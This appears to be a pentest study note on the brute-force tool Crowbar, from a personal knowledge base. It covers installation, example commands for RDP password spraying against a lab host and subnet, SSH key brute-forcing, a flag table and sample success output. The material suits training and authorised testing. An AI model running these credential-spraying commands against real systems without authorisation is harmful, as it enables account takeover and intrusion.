---
tags: [tool, attack/network]
module: attacking_common_services
last_updated: 2026-05-11
source_count: 1
---

# Crowbar

Brute-force tool focused on RDP, SSH (public key), VNC, and OpenVPN; more reliable than Hydra for RDP spraying.

## Overview

Crowbar fills a gap where Hydra's RDP module is unreliable. Its primary use case is RDP password spraying. It also supports SSH key brute-force (testing a private key against many hosts) and VNC.

## Installation

```bash
# Check if installed
crowbar --version 2>/dev/null || crowbar -h 2>/dev/null | head -1 || echo "not installed"

# Install (Kali / Parrot)
sudo apt install crowbar -y

# Verify
crowbar --version 2>/dev/null || crowbar -h 2>&1 | head -2
```

## Common usage

```bash
# RDP password spray — single password against user list
crowbar -b rdp -s 10.129.14.128/32 -U users.txt -c 'password123'

# RDP spray against a subnet
crowbar -b rdp -s 10.129.14.0/24 -U users.txt -c 'password123'

# SSH with single user and password list
crowbar -b sshkey -s 10.129.14.128/32 -u admin -k ~/.ssh/id_rsa
```

## Common flags

| Flag | Description |
|------|-------------|
| `-b <service>` | Target service: `rdp`, `sshkey`, `vnckey`, `openvpn` |
| `-s <cidr>` | Target IP or subnet (CIDR notation) |
| `-u <user>` | Single username |
| `-U <file>` | Username list |
| `-c <pass>` | Single password |
| `-C <file>` | Password list |
| `-k <keyfile>` | SSH private key file |
| `-n <threads>` | Number of threads (default 5) |
| `-o <file>` | Output file |

## Output

```
RDP-SUCCESS : 10.129.14.128:3389 - administrator:password123
```

## Gotchas & notes

- CIDR notation required for `-s` even for single hosts (`/32`)
- Crowbar is slower than Hydra but significantly more reliable for RDP
- Does not support as many protocols as Hydra — use Hydra for HTTP/FTP/SMTP

## Related pages

- [[attack/rdp]]
- [[tools/attack/hydra]]

## Sources

- raw/attacking_common_services/rdp_attacking_rdp.md
